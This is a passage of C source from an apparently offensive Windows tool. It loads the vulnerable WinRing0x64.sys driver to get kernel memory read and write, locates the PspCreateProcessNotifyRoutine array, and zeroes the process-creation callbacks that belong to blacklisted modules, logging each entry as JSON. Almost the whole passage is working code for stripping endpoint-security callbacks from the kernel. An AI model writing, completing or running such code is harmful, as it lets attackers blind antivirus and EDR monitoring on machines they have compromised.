        printf("[byovd] PsSetCreateProcessNotifyRoutine not found\n");
        return 0;
    }
    printf("[byovd] PsSetCreateProcessNotifyRoutine @ 0x%016llX\n",
           (unsigned long long)fn_va);

    /* Read first 512 bytes of function body into local buffer */
    BYTE body[512] = {0};
    for (int i = 0; i < (int)sizeof(body); i += 8) {
        ULONG64 quad = 0;
        if (!byovd_read8(fn_va + (ULONG64)i, &quad)) break;
        memcpy(body + i, &quad, 8);
    }

    /*
     * Scan for LEA RDX,[RIP+disp32] (48 8D 15) or
     *          LEA RCX,[RIP+disp32] (48 8D 0D)
     * Both patterns reference the PspCreateProcessNotifyRoutine array.
     */
    for (int i = 0; i < (int)sizeof(body) - 7; i++) {
        if (body[i] != 0x48 || body[i+1] != 0x8D) continue;
        if (body[i+2] != 0x15 && body[i+2] != 0x0D) continue;

        INT32   disp      = *(INT32 *)(body + i + 3);
        ULONG64 candidate = fn_va + (ULONG64)i + 7 + (ULONG64)(INT64)disp;

        if ((candidate >> 48) != 0xFFFF) continue;  /* must be kernel space */

        printf("[byovd] PspCreateProcessNotifyRoutine @ 0x%016llX  "
               "(offset +%d, %s)\n",
               (unsigned long long)candidate, i,
               body[i+2] == 0x15 ? "LEA RDX" : "LEA RCX");
        return candidate;
    }

    printf("[byovd] array scan failed\n");
    return 0;
}

/* ============================================================
   VA → MODULE NAME
   ============================================================ */

static BOOL va_to_module(ULONG64 va, char *name_out, int name_len,
                          DORM_SYS_MODULE_INFO *mi)
{
    for (ULONG i = 0; i < mi->Count; i++) {
        ULONG64 base = (ULONG64)(ULONG_PTR)mi->Modules[i].ImageBase;
        ULONG64 end  = base + (ULONG64)mi->Modules[i].ImageSize;
        if (va >= base && va < end) {
            const char *fn = mi->Modules[i].FullPathName
                           + mi->Modules[i].OffsetToFileName;
            strncpy(name_out, fn, (size_t)(name_len - 1));
            name_out[name_len - 1] = '\0';
            return TRUE;
        }
    }
    name_out[0] = '\0';
    return FALSE;
}

/* ============================================================
   CALLBACK ENUMERATION + REMOVAL
   ============================================================ */

int dorm_enum_process_callbacks(const char *output_path)
{
    return dorm_remove_process_callbacks(NULL, 0, output_path);
}

int dorm_remove_process_callbacks(const char **blacklist,
                                   int          bl_count,
                                   const char  *output_path)
{
    /* *the notify array: sixty-four slots, most of them promises to watch* */
    ULONG64 kernel_base = byovd_get_kernel_base();
    if (!kernel_base) {
        printf("[byovd] kernel base resolution failed\n");
        return -1;
    }
    printf("[byovd] ntoskrnl @ 0x%016llX\n", (unsigned long long)kernel_base);

    /*
     * FIX 5: Physical scan MUST run before the first byovd_read8 call.
     * Without it, byovd_read4 → va_to_pa → va_to_pa_delta returns 0
     * for every address because g_ntoskrnl_pa_base is 0.
     */
    if (!g_ntoskrnl_pa_base) {
        if (!byovd_find_ntoskrnl_phys(kernel_base)) {
            printf("[byovd] physical base scan failed — cannot translate VAs\n");
            return -1;
        }
    }

    /* Also initialise CR3 now so pool VAs are walkable */
    if (!g_cr3) init_cr3();

    ULONG64 arr = find_pspcrn_array(kernel_base);
    if (!arr) return -1;

    BYTE *mi_buf = nqsi_alloc(SYSTINFO_MODULES);
    if (!mi_buf) return -1;
    DORM_SYS_MODULE_INFO *mi = (DORM_SYS_MODULE_INFO *)mi_buf;

    FILE *fp = open_output(output_path);
    if (!fp) { HeapFree(GetProcessHeap(), 0, mi_buf); return -1; }

    char ts[32] = {0};
    ts_now(ts, sizeof(ts));

    fprintf(fp,
        "{\n"
        "  \"collector\": \"byovd_process_callbacks\",\n"
        "  \"driver\": \"WinRing0x64.sys\",\n"
        "  \"timestamp_utc\": \"%s\",\n"
        "  \"kernel_base\": \"0x%016llX\",\n"
        "  \"ntoskrnl_pa_base\": \"0x%016llX\",\n"
        "  \"PspCreateProcessNotifyRoutine\": \"0x%016llX\",\n"
        "  \"dry_run\": %s,\n"
        "  \"callbacks\": [\n",
        ts,
        (unsigned long long)kernel_base,
        (unsigned long long)g_ntoskrnl_pa_base,
        (unsigned long long)arr,
        (blacklist == NULL) ? "true" : "false");

    int  found   = 0;
    int  removed = 0;
    BOOL first   = TRUE;

    for (ULONG i = 0; i < PSPCRN_MAX_ENTRIES; i++) {
        ULONG64 entry = 0;
        if (!byovd_read8(arr + (ULONG64)i * 8, &entry) || !entry) continue;

        ULONG64 block_ptr = entry & ~0xFULL;
        if (!block_ptr) continue;

        /* EX_CALLBACK_ROUTINE_BLOCK lives in NonPagedPool — use page walk */
        ULONG64 callback_fn = 0;
        if (!byovd_read8(block_ptr + EX_CB_FUNC_OFFSET, &callback_fn)
            || !callback_fn)
            continue;

        char module_name[256] = {0};
        va_to_module(callback_fn, module_name, sizeof(module_name), mi);

        BOOL blacklisted = FALSE;
        for (int b = 0; b < bl_count; b++) {
            if (blacklist[b] && _stricmp(module_name, blacklist[b]) == 0) {
                blacklisted = TRUE;
                break;
            }
        }

        if (!first) fputs(",\n", fp);
        first = FALSE;

        fprintf(fp,
            "    {\"index\":%lu"
            ",\"entry\":\"0x%016llX\""
            ",\"block\":\"0x%016llX\""
            ",\"callback\":\"0x%016llX\""
            ",\"module\":",
            i,
            (unsigned long long)entry,
            (unsigned long long)block_ptr,
            (unsigned long long)callback_fn);
        json_escape(fp, module_name[0] ? module_name : "<unknown>");

        if (blacklisted && blacklist != NULL) {
            if (byovd_write8(arr + (ULONG64)i * 8, 0)) {
                fputs(",\"action\":\"REMOVED\"}", fp);
                printf("[byovd] removed callback[%lu] — %s @ 0x%016llX\n",
                       i, module_name,
                       (unsigned long long)callback_fn);
                removed++;
            } else {
                fputs(",\"action\":\"REMOVE_FAILED\"}", fp);
            }
        } else {
            fputs(",\"action\":\"kept\"}", fp);
            printf("[byovd] callback[%lu] — %-40s @ 0x%016llX\n",
                   i,
                   module_name[0] ? module_name : "<unknown>",
                   (unsigned long long)callback_fn);
        }

        found++;
    }

    fprintf(fp,
        "\n  ],\n"
        "  \"callbacks_found\": %d,\n"
        "  \"callbacks_removed\": %d\n"
        "}\n",
        found, removed);

    if (fp != stdout) fclose(fp);
    HeapFree(GetProcessHeap(), 0, mi_buf);

    printf("[byovd] %d callbacks found, %d removed\n", found, removed);
    return found;
}